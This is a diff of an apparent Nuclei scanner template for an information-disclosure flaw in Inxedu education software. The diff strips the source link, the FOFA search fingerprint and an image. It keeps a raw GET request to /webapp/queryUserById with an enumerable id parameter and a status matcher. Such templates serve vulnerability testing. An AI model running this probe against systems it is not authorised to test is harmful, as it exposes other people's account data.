@@ -3,21 +3,15 @@ info:
   name: 因酷教育软件queryUserById存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wvcn3fmycyu44pzg'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wvcn3fmycyu44pzg
-    fofa: body="/image/keupload?" && body="uploadSimpleUrl"
 http:
 - raw:
   - 'Id可遍历
 
     GET /webapp/queryUserById?id=7 HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757831013426-1ae7bd0e-94eb-4067-9a80-d60daa3b90e5.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
